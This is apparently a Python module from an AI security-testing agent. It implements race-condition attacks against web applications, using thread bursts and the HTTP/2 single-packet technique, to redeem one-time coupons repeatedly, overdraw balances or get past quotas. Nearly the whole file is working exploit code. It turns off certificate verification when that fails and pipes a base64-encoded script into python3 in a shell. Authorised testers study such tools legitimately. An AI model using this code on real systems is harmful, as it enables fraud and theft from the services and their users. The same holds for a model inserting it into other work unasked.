"""Race-condition primitive — fire N identical requests as concurrently as possible and detect a
TOCTOU / limit-bypass win. The money classes: redeem a one-time coupon/gift-card twice, withdraw
past a balance, accept an invite/vote/like beyond the cap, bypass a rate/quota check — all are
"the check and the use aren't atomic" and only show up under concurrency, which a sequential agent
never reproduces. One call fires the burst through the sandbox proxy (scope + rate still bind) and
reports whether the limited action succeeded MORE than it should have.

ponytail: threads racing urllib get the app-level window on most targets; it is NOT the last-byte
single-packet sync (that needs raw HTTP/2 frame control — graduate to that only if a tight window
resists threads). State-changing by nature, so it is gated to the ONE request the operator passes
and never auto-fires a destructive verb it wasn't given.
"""
import base64
import inspect
import json


def analyze(results: list, expect_success: int = 1, success_re: str = "") -> tuple:
    """results = [{status,len,ok}]. Returns (is_race, summary). A race is >expect_success successes on
    an action meant to succeed at most `expect_success` times (default 1 = one-time action)."""
    import re
    scre = re.compile(success_re, re.I) if success_re else None
    succ = 0
    for r in results:
        ok = r.get("ok")
        if ok is None:
            st = r.get("status")
            ok = isinstance(st, int) and 200 <= st < 300
        succ += 1 if ok else 0
    is_race = succ > expect_success
    statuses = {}
    for r in results:
        statuses[r.get("status")] = statuses.get(r.get("status"), 0) + 1
    dist = ", ".join(f"{k}×{v}" for k, v in sorted(statuses.items(), key=lambda x: str(x[0])))
    msg = (f"{succ}/{len(results)} requests succeeded (expected <= {expect_success}); status dist: {dist}")
    if is_race:
        msg = ("RACE WINDOW CONFIRMED — " + msg + ". The limited action completed more than once "
               "under concurrency (TOCTOU). Confirm the side effect (balance/coupon/quota) persisted.")
    else:
        msg = "no race detected — " + msg
    return is_race, msg


# ---------------------------------------------------------------------------------------------
# HTTP/2 single-packet attack (Kettle). The thread-barrier below wins app-level windows but opens N
# TCP connections, so network jitter smears arrival — a tight (sub-ms) window survives it. The
# single-packet attack removes the jitter: N requests multiplexed on ONE h2 connection, every
# request's LAST byte withheld, then all last bytes flushed in ONE TCP packet, so the server
# receives N complete requests simultaneously. HPACK is stateful+huffman-coded, so we drive the
# `h2` sans-io state machine (never hand-roll frames). h2 is imported lazily: no h2 in the sandbox
# -> run() falls back to threads automatically.
# ---------------------------------------------------------------------------------------------

def _h2_segments(reqs, authority, scheme):
    """Build (conn, preface, heads, tails) for a single-packet burst of the request specs in `reqs`
    on ONE h2 connection. Each req = {method, path, headers, body}. The requests may be DISTINCT
    (multi-endpoint / multi-step races — e.g. register + N confirms interleaved) or identical (the
    classic N-of-one limit-overrun). `heads` = each request minus its final byte/frame (send first);
    `tails` = the withheld final piece of each (flush together). Sans-io → the withhold-then-flush
    contract is unit-testable without a socket. Raises if h2 is unavailable."""
    import h2.connection
    import h2.config
    conn = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True))
    conn.initiate_connection()
    preface = conn.data_to_send()
    heads, tails = [], []
    for r in reqs:
        method = (r.get("method") or "POST").upper()
        body = r.get("body") or ""
        body_b = body.encode() if isinstance(body, str) else body
        hdrs = [(":method", method), (":path", r.get("path") or "/"),
                (":scheme", scheme), (":authority", authority)]
        if body_b:
            hdrs.append(("content-length", str(len(body_b))))
        hdrs += [(str(k).lower(), str(v)) for k, v in (r.get("headers") or {}).items()
                 if str(k).lower() not in ("host", "content-length", "connection")]
        sid = conn.get_next_available_stream_id()
        if body_b:                                   # withhold the last BODY byte + END_STREAM
            conn.send_headers(sid, hdrs, end_stream=False)
            if body_b[:-1]:
                conn.send_data(sid, body_b[:-1], end_stream=False)
            heads.append(conn.data_to_send())
            conn.send_data(sid, body_b[-1:], end_stream=True)
            tails.append(conn.data_to_send())
        else:                                        # bodiless: HEADERS is the head, empty END_STREAM the tail
            conn.send_headers(sid, hdrs, end_stream=False)
            heads.append(conn.data_to_send())
            conn.send_data(sid, b"", end_stream=True)
            tails.append(conn.data_to_send())
    return conn, preface, heads, tails


def _read_h2_responses(conn, sock, n, timeout):
    """Drain the SAME h2 conn used to send (it knows the stream ids); return {stream_id:{status,len}}."""
    import h2.events
    import time as _t
    out = {}
    deadline = _t.time() + timeout
    sock.settimeout(timeout)
    try:
        while len(out) < n and _t.time() < deadline:
            data = sock.recv(65535)
            if not data:
                break
            for ev in conn.receive_data(data):
                if isinstance(ev, h2.events.ResponseReceived):
                    st = dict(ev.headers).get(b":status") or dict(ev.headers).get(":status")
                    out.setdefault(ev.stream_id, {})["status"] = int(st) if st else None
                elif isinstance(ev, h2.events.DataReceived):
                    d = out.setdefault(ev.stream_id, {})
                    d["len"] = d.get("len", 0) + len(ev.data)
                    conn.acknowledge_received_data(ev.flow_controlled_length, ev.stream_id)
                elif isinstance(ev, h2.events.StreamEnded):
                    out.setdefault(ev.stream_id, {}).setdefault("len", 0)
            snd = conn.data_to_send()
            if snd:
                sock.sendall(snd)
    except Exception:
        pass
    return out


def _open_h2_socket(host, port, timeout):
    """TCP -> (proxy CONNECT if HTTPS_PROXY set) -> TLS with ALPN h2. Returns the negotiated ssl sock
    or raises (caller falls back to threads). Cert verification is relaxed on failure — this is an
    exploit against an operator-chosen, scope-bound target, matching real race tooling."""
    import os, ssl, socket, urllib.parse
    proxy = os.environ.get("HTTPS_PROXY") or os.environ.get("https_proxy")

    def _connect():                          # fresh TCP each call (a failed TLS handshake kills it)
        if proxy:
            pu = urllib.parse.urlparse(proxy if "://" in proxy else "http://" + proxy)
            raw = socket.create_connection((pu.hostname, pu.port or 8080), timeout=timeout)
            raw.sendall(f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n".encode())
            resp = b""
            while b"\r\n\r\n" not in resp:
                chunk = raw.recv(4096)
                if not chunk:
                    break
                resp += chunk
            if b" 200" not in resp.split(b"\r\n", 1)[0]:
                raise OSError(f"proxy CONNECT refused: {resp[:80]!r}")
        else:
            raw = socket.create_connection((host, port), timeout=timeout)
        raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # no Nagle: the tail packet ships now
        return raw

    def _wrap(ctx):
        ctx.set_alpn_protocols(["h2"])
        return ctx.wrap_socket(_connect(), server_hostname=host)

    try:
        s = _wrap(ssl.create_default_context())
    except ssl.SSLError:                     # self-signed/unknown-CA target: reconnect, don't verify
        s = _wrap(ssl._create_unverified_context())
    if s.selected_alpn_protocol() != "h2":
        s.close()
        raise OSError("target did not negotiate HTTP/2 (ALPN)")
    return s


def single_packet(url, method="POST", headers=None, body="", n=20, timeout=15, gate=0.10,
                  reqs=None, prep=None):
    """Live single-packet burst. `reqs` = list of {method,path,headers,body} fired TOGETHER (distinct
    for multi-endpoint/multi-step races, or identical for the classic N-of-one); if omitted, builds n
    identical from (url,method,headers,body). `prep` = an optional request sent+completed on a separate
    connection BEFORE the burst (register / obtain a session); its Set-Cookie is merged into burst
    requests that don't set their own Cookie. Returns (results, wall)."""
    import time, ssl, urllib.parse, urllib.request, urllib.error
    u = urllib.parse.urlparse(url)
    if u.scheme != "https":
        raise OSError("single-packet requires https (h2 over TLS); use threads for http")
    host = u.hostname
    port = u.port or 443
    authority = host if port == 443 else f"{host}:{port}"
    base = f"https://{authority}"

    prep_cookies = ""                            # optional pre-burst request (state/session setup)
    if prep:
        pbody = prep.get("body") or ""
        preq = urllib.request.Request(base + (prep.get("path") or "/"),
                                      data=(pbody.encode() if pbody else None),
                                      method=(prep.get("method") or "POST").upper())
        for k, v in (prep.get("headers") or {}).items():
            preq.add_header(k, v)
        try:
            with urllib.request.urlopen(preq, timeout=timeout,
                                        context=ssl._create_unverified_context()) as pr:
                sc = pr.headers.get_all("Set-Cookie") or []
        except urllib.error.HTTPError as e:
            sc = e.headers.get_all("Set-Cookie") or []
        prep_cookies = "; ".join(c.split(";", 1)[0] for c in sc)

    if reqs is None:                             # back-compat: n identical requests from the url
        path = (u.path or "/") + (("?" + u.query) if u.query else "")
        reqs = [{"method": method, "path": path, "headers": dict(headers or {}), "body": body}
                for _ in range(n)]
    else:
        reqs = [dict(r) for r in reqs]
    if prep_cookies:                             # apply the captured session to reqs lacking a Cookie
        for r in reqs:
            if "cookie" not in {str(k).lower() for k in (r.get("headers") or {})}:
                r.setdefault("headers", {})["Cookie"] = prep_cookies
    n = len(reqs)
    conn, preface, heads, tails = _h2_segments(reqs, authority, "https")
    s = _open_h2_socket(host, port, timeout)
    try:
        t0 = time.time()
        s.sendall(preface)
        s.sendall(b"".join(heads))          # every request, each missing its final byte
        time.sleep(gate)                    # let the heads arrive and the server buffer all N
        s.sendall(b"".join(tails))          # <-- the single packet: all final bytes released together
        resp = _read_h2_responses(conn, s, n, timeout)
        wall = round(time.time() - t0, 3)
    finally:
        try:
            s.close()
        except Exception:
            pass
    results = [resp.get(sid, {"status": None, "len": 0}) for sid in sorted(resp) ] or \
              [{"status": None, "len": 0} for _ in range(n)]
    # normalize to exactly n rows (missing streams = no response)
    while len(results) < n:
        results.append({"status": None, "len": 0})
    return results[:n], wall


def _script(params: dict) -> str:
    return "import json,time,threading,urllib.request,urllib.error\n" + \
           f"P=json.loads(r'''{json.dumps(params)}''')\n" + r'''
URL=P["url"]; METHOD=P.get("method","POST"); N=int(P.get("n",20))
BODY=P.get("body"); HEADERS=P.get("headers",{}) or {}
TIMEOUT=float(P.get("timeout",15))
data=BODY.encode() if isinstance(BODY,str) and BODY else None
results=[None]*N; barrier=threading.Barrier(N)
def fire(i):
    r=urllib.request.Request(URL,data=data,method=METHOD)
    for k,v in HEADERS.items(): r.add_header(k,v)
    try:
        barrier.wait(timeout=TIMEOUT)          # release all threads at once -> tightest window
    except Exception: pass
    try:
        resp=urllib.request.urlopen(r,timeout=TIMEOUT)
        results[i]={"status":resp.getcode(),"len":len(resp.read())}
    except urllib.error.HTTPError as e:
        try: n=len(e.read())
        except Exception: n=0
        results[i]={"status":e.code,"len":n}
    except Exception as ex:
        results[i]={"status":None,"len":0,"err":str(ex)[:60]}
ths=[threading.Thread(target=fire,args=(i,)) for i in range(N)]
t0=time.time()
for t in ths: t.start()
for t in ths: t.join()
print("RACE_JSON:"+json.dumps({"results":results,"wall":round(time.time()-t0,3)}))
'''


def _h2_runner_script(params: dict) -> str:
    """Assemble a self-contained sandbox script from THIS module's own single-packet functions
    (inspect.getsource -> one source of truth; the code the self-test exercises is the code the
    sandbox runs). Each function imports its deps internally, so the concatenation stands alone."""
    src = "\n\n".join(inspect.getsource(f) for f in
                      (_h2_segments, _read_h2_responses, _open_h2_socket, single_packet))
    pj = base64.b64encode(json.dumps(params).encode()).decode()
    footer = (
        "\nimport json as _json, base64 as _b64\n"
        f"_P=_json.loads(_b64.b64decode('{pj}').decode())\n"
        "try:\n"
        "    _res,_wall=single_packet(_P['url'],_P.get('method','POST'),_P.get('headers') or {},\n"
        "        _P.get('body') or '',int(_P.get('n',20)),float(_P.get('timeout',15)),\n"
        "        float(_P.get('gate',0.10)),reqs=_P.get('reqs'),prep=_P.get('prep'))\n"
        "    print('RACE_JSON:'+_json.dumps({'results':_res,'wall':_wall,'engine':'single-packet'}))\n"
        "except Exception as _e:\n"
        "    print('RACE_ERR:'+repr(_e)[:200])\n")
    return src + footer


def run(sb, args: dict) -> str:
    url = args.get("url") or ""
    if not url.startswith("http"):
        return "race error: 'url' must be an absolute http(s) URL (the one-time/limited action)."
    headers = {}
    h = args.get("headers")
    if isinstance(h, dict):
        headers = {str(k): str(v) for k, v in h.items()}
    elif isinstance(h, str) and ":" in h:
        for line in h.replace("\\n", "\n").splitlines():
            if ":" in line:
                k, _, v = line.partition(":")
                headers[k.strip()] = v.strip()
    def _asjson(v):                                      # accept a JSON string or an already-parsed value
        if isinstance(v, str) and v.strip():
            try:
                return json.loads(v)
            except Exception:
                return None
        return v
    reqs = _asjson(args.get("requests"))
    reqs = reqs if isinstance(reqs, list) and reqs else None
    prep = _asjson(args.get("prep"))
    prep = prep if isinstance(prep, dict) else None
    params = {"url": url, "method": (args.get("method") or "POST").upper(),
              "n": min(int(args.get("n") or 20), 60), "body": args.get("body") or "",
              "headers": headers, "timeout": float(args.get("timeout") or 15),
              "gate": float(args.get("gate") or 0.10), "reqs": reqs, "prep": prep}
    mode = (args.get("mode") or "auto").lower()          # auto | h2 | threads
    # a multi-request burst (distinct/prep) only works via single-packet — never the N-identical threads
    if (reqs or prep) and url.startswith("https"):
        mode = "h2"
    engine, payload, note = "thread-barrier", None, ""

    def _exec(script: str):
        b64 = base64.b64encode(script.encode()).decode()
        out = sb.bash(f"echo {b64} | base64 -d | python3 -", timeout=120)
        for line in out.splitlines():
            if line.startswith("RACE_JSON:"):
                try:
                    return json.loads(line[len("RACE_JSON:"):]), out
                except Exception:
                    return None, out
        return None, out

    if mode in ("auto", "h2") and url.startswith("https"):
        payload, raw = _exec(_h2_runner_script(params))
        if payload is not None:
            engine = "single-packet h2"
        elif mode == "h2":
            return "race (single-packet) failed — sandbox output:\n" + raw[:600]
        else:                                            # auto: h2 unavailable/refused -> threads
            note = "  [single-packet unavailable — fell back to threads]\n"

    if payload is None:                                  # threads (http targets, or h2 fallback)
        payload, raw = _exec(_script(params))
        engine = "thread-barrier"
    if payload is None:
        return "race: no result parsed — sandbox output:\n" + raw[:500]

    is_race, msg = analyze(payload["results"], int(args.get("expect_success") or 1),
                           args.get("success_re") or "")
    shape = f"{len(reqs)} distinct" if reqs else f"{params['n']} {params['method']}"
    prepnote = " (after prep)" if prep else ""
    head = (f"RACE {'!! ' if is_race else ''}({shape} via {engine}{prepnote} "
            f"in {payload['wall']}s)\n")
    return head + note + msg


def demo() -> None:
    # 3 successes on a one-time action -> race
    r = [{"status": 200, "len": 5}] * 3 + [{"status": 409, "len": 2}] * 17
    is_race, msg = analyze(r, expect_success=1)
    assert is_race and "RACE WINDOW CONFIRMED" in msg, msg
    # exactly one success -> no race
    r2 = [{"status": 200, "len": 5}] + [{"status": 409, "len": 2}] * 19
    assert not analyze(r2, 1)[0]
    # explicit ok flags respected
    assert analyze([{"ok": True}, {"ok": True}], 1)[0]
    # success_re-style success via status still works; distribution rendered
    assert "status dist" in analyze(r2, 1)[1]
    # single-packet contract (sans-io, no socket): the withheld final bytes mean the heads alone
    # complete ZERO requests server-side; releasing the tails completes ALL of them at once.
    try:
        import h2.connection, h2.config, h2.events
    except ImportError:
        print("race.py ok (single-packet sans-io check skipped: h2 not installed)")
        return
    srv = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=False))
    srv.initiate_connection()
    ident = [{"method": "POST", "path": "/redeem", "headers": {"cookie": "s=1"}, "body": "code=ABC"}
             for _ in range(5)]
    _, preface, heads, tails = _h2_segments(ident, "t", "https")
    ended = sum(isinstance(e, h2.events.StreamEnded)
                for e in srv.receive_data(preface + b"".join(heads)))
    assert ended == 0, f"heads alone completed {ended} streams — final byte was NOT withheld"
    ended += sum(isinstance(e, h2.events.StreamEnded) for e in srv.receive_data(b"".join(tails)))
    assert ended == 5, f"after the single-packet flush {ended}/5 streams completed (want 5)"
    # bodiless (GET) path also withholds correctly
    srv2 = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=False))
    srv2.initiate_connection()
    _, pf, hd, tl = _h2_segments([{"method": "GET", "path": "/x"} for _ in range(3)], "t", "https")
    e0 = sum(isinstance(e, h2.events.StreamEnded) for e in srv2.receive_data(pf + b"".join(hd)))
    e1 = e0 + sum(isinstance(e, h2.events.StreamEnded) for e in srv2.receive_data(b"".join(tl)))
    assert e0 == 0 and e1 == 3, f"bodiless withhold broken: heads={e0} after-flush={e1}"
    # NEW: a burst of DISTINCT requests (multi-step race) — all withheld, all arrive together, and the
    # server sees the distinct paths (register + 2 confirms interleaved in ONE packet).
    srv3 = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=False))
    srv3.initiate_connection()
    multi = [{"method": "POST", "path": "/register", "body": "u=a"},
             {"method": "POST", "path": "/confirm", "body": "u=a"},
             {"method": "POST", "path": "/confirm", "body": "u=a"}]
    _, pf3, hd3, tl3 = _h2_segments(multi, "t", "https")
    paths, ended3 = [], 0
    for e in srv3.receive_data(pf3 + b"".join(hd3)):
        if isinstance(e, h2.events.RequestReceived):
            paths.append(dict(e.headers).get(b":path"))
        ended3 += isinstance(e, h2.events.StreamEnded)
    assert ended3 == 0, "distinct-request heads should complete nothing before the flush"
    ended3 += sum(isinstance(e, h2.events.StreamEnded) for e in srv3.receive_data(b"".join(tl3)))
    assert ended3 == 3, f"distinct burst: {ended3}/3 completed after flush"
    assert paths == [b"/register", b"/confirm", b"/confirm"], paths   # distinct paths preserved
    print("race.py ok")


if __name__ == "__main__":
    demo()
